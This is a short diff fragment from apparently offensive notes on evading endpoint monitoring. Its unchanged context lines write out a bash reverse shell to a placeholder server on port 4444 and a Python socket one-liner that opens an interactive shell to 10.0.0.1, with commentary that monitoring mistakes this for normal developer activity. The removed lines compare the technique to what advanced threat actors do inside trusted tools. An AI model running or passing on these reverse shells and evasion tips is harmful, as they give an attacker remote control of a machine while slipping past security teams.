@@ -268,10 +268,7 @@ bash -i >& /dev/tcp/your-server/4444 0>&1
 python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 Monitoring sees: python3 -c "..." — looks like a developer doing something clever. No binary drop, no unusual parent process, no suspicious file writes.
 
-The irony:
-You're doing exactly what sophisticated APTs do — using the tools already trusted in the environment. The difference is you're doing it transparently in an IDE, which is arguably more trusted than a random PowerShell window.
 
-Why this works so well:
 Security teams build detections for:
 
 cmd.exe launching powershell.exe (loud)
